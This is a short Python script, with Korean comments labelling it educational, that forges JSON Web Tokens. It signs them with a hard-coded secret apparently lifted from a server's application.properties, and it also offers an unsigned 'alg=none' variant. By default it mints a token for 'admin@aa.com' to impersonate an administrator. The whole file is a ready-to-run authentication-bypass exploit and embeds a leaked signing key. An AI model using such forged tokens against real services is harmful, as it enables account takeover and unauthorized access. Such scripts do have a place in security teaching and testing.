# -*- coding: utf-8 -*-
# 교육용: 알려진 secret 으로 JWT 를 직접 서명(위조)한다. (의존성 없이 표준 라이브러리만)
import hmac, hashlib, base64, json, time, sys

# application.properties 의 jwt.secret 값(문자열). 서버는 이 문자열의 getBytes() 를 HMAC 키로 쓴다.
SECRET = "5367566B59703373367639792F423F4528482B4D6251655468576D5A71347437"

def b64u(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

def forge(sub, ttl=3600, alg="HS256"):
    header = {"alg": alg}
    now = int(time.time())
    payload = {"sub": sub, "iat": now, "exp": now + ttl}
    h = b64u(json.dumps(header, separators=(",", ":")).encode())
    p = b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = h + b"." + p
    if alg == "none":
        return (signing_input + b".").decode()
    sig = hmac.new(SECRET.encode(), signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + b64u(sig)).decode()

if __name__ == "__main__":
    sub = sys.argv[1] if len(sys.argv) > 1 else "admin@aa.com"
    alg = sys.argv[2] if len(sys.argv) > 2 else "HS256"
    print(forge(sub, alg=alg))
